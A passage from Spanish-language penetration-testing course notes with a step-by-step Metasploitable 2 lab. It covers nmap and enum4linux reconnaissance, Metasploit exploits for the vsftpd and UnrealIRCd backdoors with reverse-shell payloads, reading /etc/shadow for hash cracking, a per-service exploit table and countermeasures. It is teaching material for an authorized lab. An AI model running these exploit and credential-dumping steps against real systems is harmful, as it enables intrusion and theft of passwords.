smbclient //192.168.56.103/share -U user%password

# ============================================================================
# IMPORTANTE: En el laboratorio, las otras VMs son objetivos autorizados
# En un pentesting real, esto dependería del alcance.
# ============================================================================
```

---

## 8. LABORATORIO COMPLETO PASO A PASO

### 8.1. Escenario Completo

```bash
# ============================================================================
# LABORATORIO COMPLETO: EXPLOTACIÓN DE METASPLOITABLE 2
# ============================================================================

# ============================================================================
# FASE 0: PREPARACIÓN
# ============================================================================

# 1. Verificar que Kali está actualizado
sudo apt update && sudo apt upgrade -y

# 2. Iniciar servicios necesarios
sudo systemctl start postgresql

# 3. Verificar IPs de todas las VMs
# Kali debe ser 192.168.56.101
# Metasploitable 2 debe ser 192.168.56.102
ifconfig | grep "inet addr"
# Esperado: 192.168.56.101

ping -c 2 192.168.56.102
# Esperado: 0% packet loss

# ============================================================================
# FASE 1: RECONOCIMIENTO Y ESCANEO
# ============================================================================

# 4. Escaneo rápido de hosts
nmap -sn 192.168.56.0/24

# 5. Escaneo completo de Metasploitable 2
nmap -p- -A -T4 192.168.56.102 -oA /tmp/ms2_scan

# 6. Ver servicios detectados
cat /tmp/ms2_scan.nmap | grep -E "PORT|open"

# 7. Escaneo de vulnerabilidades
nmap --script vuln 192.168.56.102 -oA /tmp/ms2_vulns

# ============================================================================
# FASE 2: ENUMERACIÓN
# ============================================================================

# 8. Enumerar usuarios SMB
enum4linux -a 192.168.56.102

# 9. Enumerar HTTP
nikto -h http://192.168.56.102

# 10. Ver página web
curl -s http://192.168.56.102 | grep -i title

# ============================================================================
# FASE 3: EXPLOTACIÓN CON METASPLOIT
# ============================================================================

# 11. Iniciar msfconsole
msfconsole -q

# 12. Verificar base de datos
db_status

# 13. Importar resultados de nmap (opcional)
db_import /tmp/ms2_scan.xml
hosts
services

# 14. BUSCAR EXPLOIT PARA VSFTPD
search vsftpd
# Identificar: exploit/unix/ftp/vsftpd_234_backdoor

# 15. USAR EXPLOIT
use exploit/unix/ftp/vsftpd_234_backdoor

# 16. CONFIGURAR
set RHOSTS 192.168.56.102
show options

# 17. CONFIGURAR PAYLOAD
set PAYLOAD cmd/unix/reverse_perl
set LHOST 192.168.56.101
set LPORT 4444

# 18. EJECUTAR
exploit

# 19. VERIFICAR SESIÓN
# Deberías ver: "Command shell session X opened"
sessions -l

# 20. INTERACTUAR CON SESIÓN
sessions -i 1

# ============================================================================
# FASE 4: POST-EXPLOTACIÓN
# ============================================================================

# Dentro de la shell:

# 21. VERIFICAR USUARIO
whoami
# Esperado: root

# 22. VER INFO DEL SISTEMA
uname -a

# 23. VER USUARIOS
cat /etc/passwd | grep -v nologin

# 24. VER CONTRASEÑAS (SHADOW)
cat /etc/shadow

# 25. EXPORTAR HASHES PARA CRACKEAR
# Copiar hashes a Kali para crackear
# (Ver Clase 4 sobre John the Ripper)

# 26. VER DIRECTORIO HOME
ls -la /home/msfadmin

# 27. VER PROCESOS
ps aux | head -20

# 28. VER CONEXIONES DE RED
netstat -tulpn

# ============================================================================
# FASE 5: EXPLOTAR OTROS SERVICIOS
# ============================================================================

# 29. SALIR DE SESIÓN ACTUAL
exit

# 30. VOLVER A METASPLOIT
background

# 31. EXPLOTAR OTRO SERVICIO - UNREALIRC
search unrealircd
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.102
set RPORT 6667
set PAYLOAD cmd/unix/reverse_perl
set LHOST 192.168.56.101
set LPORT 4445
exploit

# ============================================================================
# ============================================================================
# ¡FELICIDADES! Has completado el laboratorio
# ============================================================================
# ============================================================================

# ============================================================================
# FASE 6: LIMPIEZA (PRÁCTICA SOLO)
# ============================================================================

# SALIR DE METASPLOIT
exit -y

# LIMPIAR SESIONES
# (En msfconsole)
# sessions -K

# ============================================================================
# ============================================================================
```

### 8.2. Tabla de Exploits para Metasploitable 2

```
┌─────────────────────────────────────────────────────────────────┐
│         EXPLOITS PARA METASPLOITABLE 2                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  SERVICIO          │ EXPLOIT                    │ PAYLOAD      │
│  ─────────         │ ─────────                  │ ───────      │
│  vsftpd 2.3.4     │ vsftpd_234_backdoor       │ reverse_perl │
│  distcc           │ distcc_exec                │ reverse_py   │
│  UnrealIRCd       │ unreal_ircd_3281_backdoor  │ reverse_perl │
│  PHP CGI          │ php_cgi_arg_injection      │ meterpreter  │
│  Samba            │ samba_symlink_traversal    │ reverse_perl │
│  VNC              │ vnc_auth_none             │ shell        │
│  SSH              │ ssh_login                 │ password     │
│  MySQL            │ mysql_login               │ password     │
│  PostgreSQL       │ postgres_login            │ password     │
│  Apache Tomcat    │ tomcat_mgr_upload         │ meterpreter  │
│  Apache James     │ james_admin              │ shell        │
│  Rservices        │ rservices_login           │ password     │
│                                                                 │
│  COMANDOS DE BÚSQUEDA:                                          │
│  ─────────────────────                                          │
│  search name=/vsftpd                                             │
│  search type=exploit platform=linux                            │
│  search cve:2011                                                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 9. CONTRAMEDIDAS

```
┌─────────────────────────────────────────────────────────────────┐
│              CONTRAMEDID PARA METASPLOITABLE 2                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  GENERAL:                                                      │
│  ├── Mantener sistemas actualizados                             │
│  ├── Deshabilitar servicios innecesarios                         │
│  ├── Usar firewall para limitar acceso                          │
│  └── Monitorear logs regularmente                              │
│                                                                 │
│  VSFTPD:                                                      │
│  ├── Actualizar a vsftpd 2.3.5+                               │
│  ├── Verificar que no existe usuario :)                        │
│  └── Deshabilitar FTP o usar SFTP                             │
│                                                                 │
│  DISTCC:                                                      │
│  ├── Deshabilitar o actualizar distcc                          │
│  └── Configurar allowlist de IPs                              │
│                                                                 │
│  UNREALIRCD:                                                  │
│  ├── Actualizar a versión sin backdoor                         │
│  └── Deshabilitar IRC si no es necesario                      │
│                                                                 │
│  SAMBA:                                                        │
│  ├── No exponer Samba a internet                              │
│  ├── Usar autenticación fuerte                                │
│  └── Limitar shares expuestos                                  │
│                                                                 │
│  PHP CGI:                                                     │
│  ├── Mantener PHP actualizado                                 │
│  ├── Deshabilitar php-cgi si no se usa                        │
│  └── Usar mod_php en lugar de CGI                            │
│                                                                 │
│  VNC:                                                         │
│  ├── Usar contraseña robusta                                  │
│  ├── No exponer VNC a internet                                │
│  └── Preferir SSH + VNC tunneling                             │
│                                                                 │
│  MySQL/PostgreSQL:                                            │
│  ├── Establecer contraseñas fuertes                            │
│  ├── Limitar acceso por IP                                     │
│  └── No usar root sin necesidad                               │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## RESUMEN FINAL

```
┌─────────────────────────────────────────────────────────────────┐
│              RESUMEN: FLUJO DE EXPLOTACIÓN                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. RECONOCIMIENTO                                             │
│     nmap -sn → Identificar hosts                               │
│                                                                 │
│  2. ESCANEO                                                    │
│     nmap -sV -sC -p- → Identificar servicios y versiones       │
│                                                                 │
│  3. ENUMERACIÓN                                                │
│     enum4linux, nikto, ftp, smbclient → Info detallada          │
│                                                                 │
│  4. EXPLOTACIÓN                                                │
│     msfconsole → Seleccionar exploit → Configurar → Ejecutar   │
│                                                                 │
│  5. POST-EXPLOTACIÓN                                          │
│     Shell → Enumerar → Escalar → Extraer datos                 │
│                                                                 │
│  6. DOCUMENTACIÓN                                              │
│     Registrar todo → Reportar                                   │
│                                                                 │
│  COMANDOS CLAVE DE METASPLOIT:                                 │
│  ├── search <término>     → Buscar módulo                     │
│  ├── use <módulo>         → Seleccionar                        │
│  ├── set <opción> <valor> → Configurar                        │
│  ├── show options         → Ver configuración                  │
│  ├── exploit/run          → Ejecutar                          │
│  ├── sessions -l          → Listar sesiones                  │
│  └── sessions -i <id>     → Interactuar                       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## PRÓXIMA CLASE

En la siguiente clase veremos: **Buffer Overflow**

- Conceptos de memoria
- Tipos de overflow (stack, heap)
- Desarrollo de exploits
- Uso de herramientas (gdb, pwntools)
- Ejemplos prácticos
